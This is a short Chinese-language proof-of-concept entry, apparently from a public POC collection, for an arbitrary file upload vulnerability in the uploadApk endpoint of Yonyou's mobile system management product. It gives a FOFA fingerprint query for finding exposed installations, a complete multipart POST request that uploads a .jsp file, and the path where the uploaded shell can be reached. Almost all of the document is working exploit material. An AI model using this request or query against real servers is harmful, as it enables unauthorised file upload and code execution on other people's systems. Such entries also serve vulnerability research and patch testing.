## 用友移动系统管理uploadApk接口存在任意文件上传

## fofa
```
body="../js/jslib/jquery.blockUI.js"
```


## poc
```
POST /maportal/appmanager/uploadApk.dopk_obj= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 196

--fa48ebfef59b133a8cd5275661b35d2c
Content-Disposition: form-data; name="downloadpath"; filename="59209.jsp"
Content-Type: application/msword

082863327
--fa48ebfef59b133a8cd5275661b35d2c--
```
![image](https://github.com/wy876/POC/assets/139549762/28bb2ff0-4455-40aa-95b3-c1815f2ee85b)

上传的shell地址拼接：

http://127.0.0.1/maupload/apk/59209.jsp
